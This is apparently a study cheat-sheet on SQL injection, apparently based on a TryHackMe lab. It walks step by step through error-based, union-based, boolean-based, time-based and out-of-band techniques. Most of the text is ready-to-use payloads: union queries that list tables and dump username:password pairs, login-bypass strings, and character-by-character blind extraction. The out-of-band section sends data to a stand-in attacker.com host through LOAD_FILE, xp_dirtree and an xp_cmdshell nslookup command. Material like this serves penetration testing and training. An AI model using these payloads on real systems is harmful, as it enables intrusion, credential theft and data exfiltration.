# In-Band SQL Injection
## Error-Based SQL Injection
Try injecting a single quote `'` into a vulnerable parameter might produce an error like:

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1
```
## Union-Based SQL Injection
**Step 1: Determine the number of columns.**

```sql
1 UNION SELECT 1          -- error (wrong column count)
1 UNION SELECT 1,2        -- error (still wrong)
1 UNION SELECT 1,2,3      -- success! The table has 3 columns
```

**Step 2: Identify which columns are displayed.** 

```sql
0 UNION SELECT 1,2,3
```

**Step 3: Extract the database name.**

```sql
0 UNION SELECT 1,2,database()
```

**Step 4 — Enumerate tables.** 

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'
```

**Step 5: Enumerate columns.**

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
```

**Step 6: Extract data.**

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
```

This returns all usernames and passwords in a readable format.

# Blind SQL Injection
## Authentication Bypass
```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```

Targetting specific user:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
```

Variations:
- `' OR 1=1;--` is classic bypass, works when the username is wrapped in single quotes
- `' OR 1=1#` this uses `#` as the comment character (MySQL alternative)
- `" OR 1=1--` for queries that use double quotes around the input
- Try both the username and password fields
## Boolean-Based
**The idea:** Imagine a username-check feature that tells you whether an account exists. `https://website.thm/checkuser?username=admin` returns `{"taken":true}` because admin is taken. `?username=admin123` returns `{"taken": false}` because that user does not exist.

**Step 1: Confirm injection.**

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```

**Step 2: Guess the database name, character by character.**

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
```

False? Not 'a'. Try `b%`, `c%`, keep going.

**Step 3: Get table and column names.**

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
```

## Time-Based
```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```

**Step 1: Find the column count.**

```sql
admin123' UNION SELECT SLEEP(5);--        -- no delay (wrong count)
admin123' UNION SELECT SLEEP(5),2;--      -- 5 second delay (2 columns!)
```

**Step 2: Enumerate data.**

```sql
admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--
```

```sql
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--
```

```sql
admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4%';--
```

# Out-of-Band SQL Injection
Forcing the database server to reach out to a server you control through a separate channel, usually DNS or HTTP, and carry the stolen data with it.

Do this if everything else has failed.

## How It Works

Two channels are involved:

1. The **attack channel**: your normal web request with the injection payload.
2. The **data channel**: an outbound network request (DNS or HTTP) that the database server makes to your server, with the exfiltrated data baked into the request itself.

## DNS Exfiltration With MySQL
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```

What happens:

1. `(SELECT database())` pulls the database name. Let's say it is `webapp_db`.
2. `CONCAT()` builds the string `\\webapp_db.attacker.com\share`.
3. `LOAD_FILE()` tries to read that file path. On Windows, this initiates a DNS lookup for `webapp_db.attacker.com`.
4. Your DNS server catches the request and logs `webapp_db`. The data is in the subdomain.

This works best on Windows-based MySQL servers where UNC paths trigger DNS resolution.

## MSSQL Techniques
Microsoft SQL Server has stored procedures that make OOB more direct:

`xp_dirtree` triggers a DNS lookup by trying to list a directory on a remote server:

```sql
EXEC master..xp_dirtree '\\attacker.com\share';
```

`xp_cmdshell` (if it is enabled) runs OS commands directly, so you can use `nslookup` or `curl` to ship data out:

```sql
EXEC xp_cmdshell 'nslookup data.attacker.com';
```

`xp_cmdshell` is off by default in modern MSSQL, but `xp_dirtree` is still available and gets used regularly in pentests